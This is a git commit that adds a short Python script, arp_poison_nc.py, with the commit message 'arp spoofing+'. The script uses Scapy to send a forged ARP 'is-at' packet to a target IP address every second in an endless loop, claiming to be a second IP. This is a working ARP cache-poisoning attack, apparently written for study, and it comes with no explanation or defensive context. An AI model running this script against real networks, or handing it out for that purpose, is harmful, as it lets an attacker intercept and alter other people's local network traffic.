fd7f089388051d2306b7ae902e8993c60fc8ce46
Faan Ross <moi@faanross.com>
2023-03-10 11:51:11 -0500

    arp spoofing+

---
+++ arp_poison_nc.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python3
+
+import sys
+import time
+from scapy.all import sendp , ARP , Ether
+
+target_ip = sys. argv[1]
+fake_ip = sys.argv[2]
+iface = sys.argv[3]
+
+ethernet = Ether()
+
+arp = ARP(pdst=target_ip ,
+        psrc=fake_ip ,
+        op="is-at")
+
+packet = ethernet / arp
+
+while True:
+    sendp(packet , iface=iface)
+    time.sleep(1)
